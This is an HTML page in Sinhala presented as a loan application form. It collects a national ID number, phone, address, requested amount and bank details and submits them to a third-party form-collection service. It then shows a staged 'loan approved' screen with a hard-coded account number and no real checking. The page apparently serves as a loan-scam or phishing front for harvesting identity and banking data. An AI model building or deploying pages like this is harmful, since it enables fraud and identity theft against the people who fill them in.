<!DOCTYPE html>
<html lang="si">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ණය අයදුම්පත</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f4f4f9; padding: 20px; text-align: center; }
        .card { background: white; padding: 20px; border-radius: 10px; max-width: 400px; margin: auto; box-shadow: 0px 0px 10px rgba(0,0,0,0.1); }
        input, button { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
        button { background: #28a745; color: white; font-size: 16px; border: none; cursor: pointer; }
        .hidden { display: none; }
        .success-box { background: #d4edda; color: #155724; padding: 15px; border-radius: 5px; margin-top: 15px; }
    </style>
</head>
<body>

    <div class="card" id="formCard">
        <h2>ණය අයදුම්පත</h2>
        <form id="loanForm" action="https://formspree.io/f/YOUR_FORM_ID" method="POST" onsubmit="saveLoanData(event)">
            <input type="text" name="nic" id="nic" placeholder="ජාතික හැඳුනුම්පත් අංකය (NIC)" required>
            <input type="text" name="phone" id="phone" placeholder="දුරකථන අංකය" required>
            <input type="text" name="address" id="address" placeholder="ලිපිනය" required>
            <input type="number" name="amount" id="amount" placeholder="අවශ්‍ය ණය මුදල" required>
            <input type="text" name="bank" id="bank" placeholder="බැංකු විස්තර" required>
            <button type="submit">අයදුම් කරන්න</button>
        </form>
    </div>

    <div class="card hidden" id="statusCard">
        <h2 id="statusTitle">⏳ අයදුම්පත ලැබුණි</h2>
        <p id="statusText">ඔබගේ ණය අයදුම්පත පරීක්ෂා කරමින් පවතී. කරුණාකර රැඳී සිටින්න...</p>
        
        <div class="hidden success-box" id="approvedDetails">
            <h3>✅ ණය අනුමත විය!</h3>
            <p><strong>ගිණුම් අංකය:</strong> <span id="accNumber"></span></p>
            <p><strong>බැංකුව:</strong> <span id="bankName"></span></p>
            <p><strong>අනුමත කළ මුදල:</strong> රු. <span id="approvedAmount"></span>/=</p>
        </div>
    </div>

    <script>
        function saveLoanData(e) {
            // මෙතනදී කස්ටමර් දාපු හැම විස්තරයක්ම සේව් කරගන්නවා
            const loanData = {
                nic: document.getElementById('nic').value,
                phone: document.getElementById('phone').value,
                address: document.getElementById('address').value,
                amount: document.getElementById('amount').value,
                bank: document.getElementById('bank').value,
                status: 'pending'
            };
            localStorage.setItem('customerLoan', JSON.stringify(loanData));
        }

        function checkStatus() {
            const data = JSON.parse(localStorage.getItem('customerLoan'));
            if (data) {
                document.getElementById('formCard').classList.add('hidden');
                document.getElementById('statusCard').classList.remove('hidden');

                if (data.status === 'approved') {
                    document.getElementById('statusTitle').innerText = "සාර්ථකයි!";
                    document.getElementById('statusText').innerText = "ඔබගේ ණය අයදුම්පත අනුමත කර ඇත.";
                    document.getElementById('approvedDetails').classList.remove('hidden');
                    document.getElementById('accNumber').innerText = "8123456789";
                    document.getElementById('bankName').innerText = data.bank;
                    document.getElementById('approvedAmount').innerText = data.amount;
                }
            }
        }

        setInterval(checkStatus, 3000);
        window.onload = checkStatus;
    </script>
</body>
</html>
